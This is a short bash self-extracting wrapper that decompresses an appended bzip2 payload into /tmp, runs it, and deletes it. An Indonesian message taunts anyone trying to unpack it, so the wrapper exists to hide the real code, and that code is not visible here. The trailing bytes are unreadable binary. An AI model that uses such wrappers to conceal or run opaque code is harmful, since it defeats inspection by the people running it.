#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�E�w  �߀@��/�:����Pso<�FD�2�P���CCF�  4�DM5  4   �����U&	��0�`F L ���je3�MFj4� ��h"RL���M�z��M��� ɵ=A���`<�7�SpLM���)=�(�h�}4	:49p=M�[Ri�F�	@� 8,~� K�<�@��&�     )�Ʃ:�>��?�Fi�[L ��C	�� ��	��ICH��=Z鏺�8�Gmz�jB�m҂���G�#�ƪ�����^z�G1ˢ�F���(�h��L$u� 6cAP�����������i���HHHHHKAP��C&��7(�?N�����F��h�A�ԃ��#D����2Z����аݏ���3���gv����߄�� ����G��$�Ģʀ�l��RApj��q@��ڐ��4�Y���2*���5i0<���@���o����0�_$�I&�^��_����^��~�! u�g8��:�l����csR# H-�D�y{�p�.�c�I���ƫG-��O=��&i:< �Uq"�#L�:��>�	B樐�]�M��"74#����F�ǅFG={P�����(�4=�7F����m��N�A�Fܙ����fSH��'6l��`_�\�܎ֱ���pmv�UWܣim�Jq4�n�8���ޣp6�$�^�/!(G��{��i$�n�#����A]$�I%͂<b;���r���.s�?��H�
h���